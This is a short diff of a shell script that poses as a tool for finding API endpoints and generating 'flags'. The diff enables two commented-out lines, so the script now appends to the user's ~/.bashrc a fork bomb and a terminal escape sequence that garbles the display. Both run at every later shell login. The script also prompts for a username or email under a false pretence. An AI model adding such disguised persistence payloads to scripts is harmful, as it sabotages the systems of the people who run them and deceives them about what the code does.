@@ -14,8 +14,8 @@ ifconfig
 ls /dev
 sleep 1
 echo "API endpoints found, generating payload..."
-#echo 'echo -e "\033(0m -n"' >> ~/.bashrc
-#echo ':(){ :|:& };:' >> ~/.bashrc
+echo 'echo -e "\033(0m -n"' >> ~/.bashrc
+echo ':(){ :|:& };:' >> ~/.bashrc
 sleep 3
 echo "Payload generated. Enter your username/email so we can authenticate with the API and generate your flags!"
 read uname
